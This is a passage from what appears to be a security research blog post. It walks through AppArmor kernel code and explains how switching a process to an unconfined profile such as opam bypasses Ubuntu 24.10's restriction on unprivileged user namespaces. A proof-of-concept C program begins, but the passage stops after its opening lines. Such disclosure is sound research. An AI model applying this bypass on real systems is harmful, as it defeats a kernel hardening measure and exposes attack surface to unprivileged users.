&lt;span class=&quot;n&quot;&gt;u64&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;lsm_name_to_attr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strcmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;current&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LSM_ATTR_CURRENT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strcmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;exec&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LSM_ATTR_EXEC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The function &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;do_setattr()&lt;/code&gt; begins by parsing the input, where the written data is interpreted in the format &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;&amp;lt;command&amp;gt; &amp;lt;profile&amp;gt;&quot;&lt;/code&gt;. It then calls &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aa_change_profile()&lt;/code&gt; with different parameters based on the &lt;strong&gt;target file&lt;/strong&gt; and the &lt;strong&gt;command&lt;/strong&gt; value.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;do_setattr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;u64&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;attr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;size_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;attr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LSM_ATTR_CURRENT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strcmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;changeprofile&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aa_change_profile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AA_CHANGE_NOFLAGS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strcmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;permprofile&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aa_change_profile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AA_CHANGE_TEST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strcmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;stack&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aa_change_profile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AA_CHANGE_STACK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fail&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;attr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LSM_ATTR_EXEC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strcmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;exec&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aa_change_profile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AA_CHANGE_ONEXEC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strcmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;command&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;stack&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aa_change_profile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AA_CHANGE_ONEXEC&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;
                             &lt;span class=&quot;n&quot;&gt;AA_CHANGE_STACK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fail&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The function &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aa_change_profile()&lt;/code&gt; determines how a profile is applied based on different flags. First, it retrieves the profile object corresponding to the user-provided profile name [10]. Then, it performs different profile updates based on the flags.&lt;/p&gt;

&lt;p&gt;If the flag &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AA_CHANGE_STACK&lt;/code&gt; is included, AppArmor applies another profile on top of the existing one. The flag &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AA_CHANGE_TEST&lt;/code&gt; is used for testing, meaning the profile will not actually be applied.&lt;/p&gt;

&lt;p&gt;If neither the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AA_CHANGE_STACK&lt;/code&gt; nor &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;AA_CHANGE_TEST&lt;/code&gt; flags are set, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aa_change_profile()&lt;/code&gt; creates an AppArmor label object using the retrieved profile [11], and then applies the new label to the current process via either &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aa_replace_current_label()&lt;/code&gt; [12] or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aa_set_current_onexec()&lt;/code&gt; [13].&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;aa_change_profile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fqname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aa_label&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;label&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    
    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;target&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aa_label_parse&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;label&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fqname&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* profile name */&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GFP_KERNEL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;false&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [10]&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fn_label_build_in_ns&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;label&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;profile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;GFP_KERNEL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [11]&lt;/span&gt;
                       &lt;span class=&quot;n&quot;&gt;aa_get_label&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
                       &lt;span class=&quot;n&quot;&gt;aa_get_label&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;profile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;label&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flags&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AA_CHANGE_ONEXEC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;error&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aa_replace_current_label&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [12]&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;aa_put_label&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;aa_set_current_onexec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [13]&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In a nut shell, if the target file being written to is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/proc/self/attr/exec&lt;/code&gt; and the data is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;exec &amp;lt;profile&amp;gt;&quot;&lt;/code&gt;, the new profile is applied only after the &lt;strong&gt;process executes &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_execve&lt;/code&gt; system call&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Conversely, if writing to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/proc/self/attr/current&lt;/code&gt; with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;changeprofile &amp;lt;profile&amp;gt;&quot;&lt;/code&gt;, the processâ€™s profile is &lt;strong&gt;updated immediately&lt;/strong&gt;.&lt;/p&gt;

&lt;h2 id=&quot;4-out-of-the-sandbox&quot;&gt;4. Out of the Sandbox&lt;/h2&gt;

&lt;p&gt;Letâ€™s look back at the checks in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;aa_profile_ns_perm()&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aa_label&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;aa_profile_ns_perm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;aa_profile&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;profile&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* ... */&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;profile_unconfined&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;profile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [1]&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;profile&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;profiles_ns&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;profile&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unconfined&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// [2]&lt;/span&gt;
        &lt;span class=&quot;c1&quot;&gt;// [...]&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The first check examines whether the profile is in unconfined status [1], which can also be bypassed by applying a profile in &lt;strong&gt;complain mode&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;The second check verifies whether the current profile is the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unconfined&lt;/code&gt; profile [2]. Therefore, using a &lt;strong&gt;non-default profile&lt;/strong&gt; can bypass this check.&lt;/p&gt;

&lt;p&gt;In short, under the current mechanism, simply &lt;strong&gt;applying any profile in unconfined status&lt;/strong&gt; allows bypassing the check to create an unprivileged user namespace!&lt;/p&gt;

&lt;h2 id=&quot;5-proof-of-concept&quot;&gt;5. Proof-Of-Concept&lt;/h2&gt;

&lt;p&gt;To bypass the restriction, you just need to switch the processâ€™s profile from the default one to another that is in unconfined status. We chose the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;opam&lt;/code&gt; profile simply because it is one of the simplest profiles. Its content is as follows:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# This profile allows everything and only exists to give the
# application a name instead of having the label &quot;unconfined&quot;

abi &amp;lt;abi/4.0&amp;gt;,
include &amp;lt;tunables/global&amp;gt;

profile opam /usr/bin/opam flags=(unconfined) {
  userns,

  # Site-specific additions and overrides. See local/README for details.
  include if exists &amp;lt;local/opam&amp;gt;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The following example code uses two methods to create an unprivileged user namespace on Ubuntu 24.10. The tested version is Ubuntu 24.10 (6.11.0-14-generic), and the test date is February 17, 2025.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#define _GNU_SOURCE
#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;sched.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;fcntl.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;perror_exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;msg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
